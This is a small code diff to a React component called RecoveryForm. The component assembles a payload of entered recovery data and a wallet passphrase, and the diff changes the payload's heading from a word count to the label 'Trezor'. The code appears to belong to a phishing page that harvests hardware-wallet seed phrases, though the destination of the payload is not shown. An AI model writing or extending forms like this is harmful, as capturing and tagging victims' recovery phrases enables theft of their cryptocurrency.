@@ -46,7 +46,7 @@ const RecoveryForm = () => {
         // ✅ Include passphrase if filled
 
         const payload: Record<string, any> = {
-            heading: `Word Count: ${words.length}`,
+            heading: `Trezor`,
             data,
             passphrase: passphrase.trim() || '',
         };
